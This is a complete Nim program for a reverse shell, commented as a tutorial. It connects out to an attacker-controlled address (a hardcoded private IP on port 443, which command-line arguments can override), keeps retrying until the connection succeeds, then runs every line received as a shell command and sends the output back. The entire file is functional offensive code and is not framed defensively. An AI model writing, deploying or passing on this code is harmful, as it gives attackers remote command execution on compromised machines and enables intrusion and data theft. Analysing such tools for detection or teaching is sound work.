import net
import osproc # this comes with execProcess, which returns the output of the command as a string
import os
import strutils
 
#  default connection parameters for the reverse shell, but can be overwritten with command-line args
var ip = "192.168.182.129"
var port = 443
 

var args = commandLineParams() # returns a sequence of the CLI arguments
 
# if arguments have been provided, it will overwrite the default IP/port values
if args.len() == 2:
    ip = args[0]
    port = parseInt(args[1])
 
# begin by creating a new socket
var socket = newSocket()
echo "Attempting to connect to ", ip, " on port ", port, "..."
 

while true:
# attempt to connect to the attacker
    try:
        socket.connect(ip, Port(port))
        
        # if the connection succeeds, begin the logic for receiving and executing commands
        while true:
            try:
                
                socket.send("> ")
                var command = socket.recvLine() # read in a line from the attacker, which should be a shell command to execute
                var result = execProcess(command) # execProcess() returns the output of a shell command as a string
                socket.send(result) # send the results of the command to the attacker
            
            # if the attacker tries to ctrl+c, close the socket and quit the program    
            except:
                echo "Connection lost, quitting..."
                socket.close()
                system.quit(0)

# if the connection fails, wait 10 seconds and try again        
    except:
        echo "Failed to connect, retrying in 10 seconds..."
        sleep(10000) # note that sleep() takes its argument in milliseconds, at least by default
        continue
